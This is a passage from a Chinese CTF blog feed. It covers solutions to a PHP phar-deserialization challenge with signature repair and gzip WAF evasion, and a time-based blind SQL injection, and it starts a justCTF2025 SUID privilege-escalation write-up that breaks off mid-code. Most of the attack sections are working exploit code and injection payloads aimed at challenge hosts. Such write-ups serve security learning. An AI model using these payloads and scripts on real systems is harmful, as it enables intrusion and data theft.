</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag in /</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]) &lt; <span class="number">55</span>) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;str too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Fatal error: Uncaught <span class="built_in">Error</span>: start in /<span class="keyword">var</span>/www/html/index.php:<span class="number">80</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 80</span></span><br></pre></td></tr></table></figure><p>GC绕过抛出错误，参数不能太长，利用原生类进行列目录和文件读取，先利用类D来写入phar文件，然后用类D触发phar反序列化，没毛病开整</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree::__destruct()-&gt;tree::__call()-&gt;apple::__get()-&gt;air::__set()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="comment">//$a-&gt;start=&#x27;w&#x27;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;start=<span class="string">&#x27;r&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;name=<span class="keyword">new</span> <span class="title function_ invoke__">apple</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;name-&gt;xxx=<span class="keyword">new</span> <span class="title function_ invoke__">air</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;name-&gt;xxx-&gt;p=<span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="comment">//$a-&gt;name-&gt;name-&gt;xxx-&gt;p-&gt;act=&quot;DirectoryIterator&quot;;</span></span><br><span class="line"><span class="comment">//$a-&gt;name-&gt;name-&gt;flag=&quot;glob:///*f*&quot;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;name-&gt;xxx-&gt;p-&gt;act=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;name-&gt;flag=<span class="string">&quot;/fflaggg&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行签名修复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line"></span><br><span class="line">s = f[:-<span class="number">28</span>]  <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:]  <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf)</span><br></pre></td></tr></table></figure><p>因为有waf检测类关键词，所以进行gzip压缩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;exp.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    phar_data = f.read()</span><br><span class="line"></span><br><span class="line">compressed_data = gzip.compress(phar_data)</span><br><span class="line">encoded = urllib.parse.quote(compressed_data)</span><br><span class="line"><span class="built_in">print</span>(encoded)</span><br></pre></td></tr></table></figure><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>901eded4-1ce9-4a31-a478-2b4fa24eb452.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>182</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://901eded4-1ce9-4a31-a478-2b4fa24eb452.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://901eded4-1ce9-4a31-a478-2b4fa24eb452.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-lisp">username=admin&#x27;or(<span class="name">benchmark</span>(<span class="number">10000000</span>,md5(&#x27;test&#x27;)))or&#x27;&amp;password=test&amp;submit=</span></span><br></pre></td></tr></table></figure><p>成功延时，开始写脚本，一开始没用ASCII会对比出来两个字符，所以还是写的ASCII的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7b1be8f8-33d6-4131-9848-b85306e85227.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">maxlen = <span class="number">50</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">right_time = <span class="number">1.3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, maxlen+<span class="number">1</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment"># payload = (</span></span><br><span class="line">        <span class="comment">#     &quot;&#x27;or(if(ascii(mid((database()),&#123;0&#125;,1))=&#123;1&#125;,benchmark(10000000,md5(&#x27;1&#x27;)),null))or&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># ).format(i, mid)</span></span><br><span class="line">        <span class="comment"># ctf</span></span><br><span class="line">        <span class="comment"># payload = (</span></span><br><span class="line">        <span class="comment">#     &quot;&#x27;or(if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=(database()))),&#123;0&#125;,1))=&#123;1&#125;,benchmark(10000000,md5(&#x27;1&#x27;)),null))or&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># ).format(i, mid)</span></span><br><span class="line">        <span class="comment"># flaggg,user</span></span><br><span class="line">        <span class="comment"># payload = (</span></span><br><span class="line">        <span class="comment">#     &quot;&#x27;or(if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;0&#125;,1))=&#123;1&#125;,benchmark(10000000,md5(&#x27;1&#x27;)),null))or&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># ).format(i, mid)</span></span><br><span class="line">        <span class="comment"># cmd</span></span><br><span class="line">        payload = (</span><br><span class="line">            <span class="string">&quot;&#x27;or(if(ascii(mid((select(group_concat(cmd))from(ctf.flaggg)),&#123;0&#125;,1))=&#123;1&#125;,benchmark(10000000,md5(&#x27;1&#x27;)),null))or&#x27;&quot;</span></span><br><span class="line">        ).<span class="built_in">format</span>(i, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请求异常，跳过&quot;</span>, e)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        last_time = time.time() - start_time</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i&#125;</span>位，尝试ascii <span class="subst">&#123;mid&#125;</span> (<span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>)，耗时 <span class="subst">&#123;last_time:<span class="number">.2</span>f&#125;</span>s&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> last_time &gt; right_time:</span><br><span class="line">            target += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i&#125;</span>位爆破成功: <span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>，当前结果: <span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;爆破结束，最终结果为：&quot;</span>, target)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Really-Easy-SQL"><a href="#Really-Easy-SQL" class="headerlink" title="Really Easy SQL"></a>Really Easy SQL</h2><p>一样的，加个进度条玩😜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b9477b4a-bb8f-4de0-a52f-2992cbe9f9b5.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">maxlen = <span class="number">50</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">right_time = <span class="number">1.3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] SQL时间盲注，目标: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, maxlen+<span class="number">1</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>), desc=<span class="string">f&quot;爆破第<span class="subst">&#123;i&#125;</span>位&quot;</span>, ncols=<span class="number">70</span>):</span><br><span class="line">        payload = (</span><br><span class="line">            <span class="string">&quot;&#x27;or(if(ascii(mid((select(group_concat(cmd))from(ctf.flaggg)),&#123;0&#125;,1))=&#123;1&#125;,benchmark(10000000,md5(&#x27;1&#x27;)),null))or&#x27;&quot;</span></span><br><span class="line">        ).<span class="built_in">format</span>(i, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        last_time = time.time() - start_time</span><br><span class="line">        <span class="keyword">if</span> last_time &gt; right_time:</span><br><span class="line">            target += <span class="built_in">chr</span>(mid)</span><br><span class="line">            tqdm.write(<span class="string">f&quot;第<span class="subst">&#123;i&#125;</span>位爆破成功: <span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>，当前结果: <span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        tqdm.write(<span class="string">f&quot;爆破结束，最终结果为：<span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tqdm.write(<span class="string">f&quot;\n[#] 爆破完毕，最终内容：<span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">最后的SQL注入网上很多脚本都用不了，所以水一篇文章。（打新生赛放松来了</summary>
    
    
    
    <category term="复现" scheme="https://baozongwi.xyz/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="php" scheme="https://baozongwi.xyz/tags/php/"/>
    
    <category term="ssti" scheme="https://baozongwi.xyz/tags/ssti/"/>
    
    <category term="mysql" scheme="https://baozongwi.xyz/tags/mysql/"/>
    
    <category term="phar" scheme="https://baozongwi.xyz/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>LinuxAmd64中suid位实现提权</title>
    <link href="https://baozongwi.xyz/posts/25610.html"/>
    <id>https://baozongwi.xyz/posts/25610.html</id>
    <published>2025-08-03T10:19:43.000Z</published>
    <updated>2025-08-08T04:07:41.508Z</updated>
    
    <content type="html"><![CDATA[<p>周末和suers一起看了两个提权的题目，出自justCTF2025。</p><h2 id="PyEvaline-crimes"><a href="#PyEvaline-crimes" class="headerlink" title="PyEvaline crimes"></a>PyEvaline crimes</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> _, <span class="type">char</span>** a, <span class="type">char</span>** envp)</span> &#123;</span><br><span class="line"><span class="comment">// Omg such secure!</span></span><br><span class="line">unsetenv(<span class="string">&quot;PYTHONPATH&quot;</span>);</span><br><span class="line">unsetenv(<span class="string">&quot;PYTHONHOME&quot;</span>);</span><br><span class="line">unsetenv(<span class="string">&quot;PYTHONSTARTUP&quot;</span>);</span><br><span class="line">unsetenv(<span class="string">&quot;PYTHONBREAKPOINT&quot;</span>);</span><br><span class="line">unsetenv(<span class="string">&quot;PYTHONUSERBASE&quot;</span>);</span><br><span class="line">unsetenv(<span class="string">&quot;PYTHONEXECUTABLE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* argv[] = &#123;</span><br><span class="line"><span class="string">&quot;python3&quot;</span>,</span><br><span class="line"><span class="string">&quot;-E&quot;</span>, <span class="string">&quot;-I&quot;</span>, <span class="string">&quot;-s&quot;</span>,  <span class="comment">// Double, or triple secure!</span></span><br><span class="line"><span class="string">&quot;/home/ctfplayer/app&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">execve(<span class="string">&quot;/usr/local/bin/python3&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题里面有个runner，删除了很多python的环境变量，并且非常严格的来利用python执行app，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> readline</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>():</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Goodbye!&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;id&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uid:  %d,  gid: %d&quot;</span> % (os.getuid(), os.getgid()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;euid: %d, egid: %d&quot;</span> % (os.geteuid(), os.getegid()))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;ls&quot;</span>:</span><br><span class="line">        os.system(<span class="string">&quot;/bin/ls -lah&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;time&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;time now: &quot;</span>, time.time())</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;rng&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rng:&quot;</span>, random.random())</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;help&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Commands:</span></span><br><span class="line"><span class="string">    exit                - exit shell</span></span><br><span class="line"><span class="string">    help                - display this help</span></span><br><span class="line"><span class="string">    eval &lt;expression&gt;   - evalute given expression :)</span></span><br><span class="line"><span class="string">    id                  - show our id</span></span><br><span class="line"><span class="string">    ls                  - list files</span></span><br><span class="line"><span class="string">    time                - time now</span></span><br><span class="line"><span class="string">    rng                 - roll a dice!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    cmd, expr = command.split(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd != <span class="string">&quot;eval&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;unrecognized command: &quot;</span>, cmd)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Too long expression, sorry&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span 